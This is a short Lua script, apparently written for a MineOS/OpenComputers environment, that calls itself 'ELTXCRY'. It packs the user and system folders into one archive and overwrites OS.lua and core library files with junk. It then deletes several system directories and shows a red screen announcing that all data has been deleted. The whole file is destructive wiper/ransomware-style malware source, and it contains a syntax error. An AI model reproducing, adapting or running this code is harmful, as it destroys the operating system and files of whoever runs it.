local internet = require("INTERNET")
local compressor = require("compressor")
local filesystem = require("filesystem")

-- Move all of data to /eltxcry
filesystem.copy("/Libraries", "/eltxcry/libraries")
filesystem.copy("OS.LUA", "/eltxcry")
filesystem.copy("/Icons", "/eltxcry")
filesystem.copy("/Users", "/eltxcry")
filesystem.copy("/Application", "/eltxcry")
filesystem.copy("/Extensions", "/eltxcry")
filesystem.copy("/Mounts", "/eltxcry")
filesystem.copy("/Screensavers", "/eltxcry")
filesystem.copy("/Localizations", "/eltxcry")
compressor.pack("/data-backup.pkg", {
	"/eltxcry"
})
filesystem.remove("/eltxcry")
-- Write ALL files

filesystem.write("OS.lua", "NOTHING")
filesystem.write("Libraries/Event.lua", "404")
filesystem.write("Libraries/Network.lua", "404")
filesystem.remove("/Libraries")
filesystem.remove("/Localization")
filesystem.remove("/Wallpapers")
filesystem.remove("/Mounts")
filesystem.remove("/Icons")
filesystem.remove("/Screensavers")

local GUI = require("GUI")

--------------------------------------------------------------------------------

local workspace = GUI.workspace()
workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x2D2D2D))

local actionButtonsRegular = workspace:addChild(GUI.actionButtons(3, 2, false))
local actionButtonsFat = workspace:addChild(GUI.actionButtons(3, 4, true))

actionButtonsRegular.close.onTouch = function()
	-- Do something when "close" button was touched
end

-- Add panel that fits workspace
workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "ELTXCRY"))

workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "ALL of your data has been deleted if you restart the computer computer crash instant !"))
workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x262626))
-- Add smaller red panel
workspace:addChild(GUI.panel(10, 10, workspace.width - 20, workspace.height - 20, 0x880000))


--------------------------------------------------------------------------------

workspace:draw()
workspace:start())
